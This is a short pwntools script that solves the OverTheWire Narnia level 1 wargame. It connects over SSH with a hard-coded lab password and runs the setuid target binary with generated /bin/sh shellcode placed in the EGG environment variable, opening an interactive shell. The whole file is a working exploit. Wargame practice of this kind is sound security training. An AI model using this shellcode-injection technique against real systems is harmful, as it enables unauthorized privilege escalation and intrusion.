from pwn import *

host = "narnia.labs.overthewire.org"
user = "narnia1"
password = "efeidiedae"
binary = "/games/narnia/narnia1"

shell = ssh(host=host, user=user, password=password)
sh = shell.run('''
python -c "
import sys, os
os.execve(%r, ['/bin/sh'], {'EGG': %r})
"
''' % (binary, asm(shellcraft.sh())))
sh.interactive()
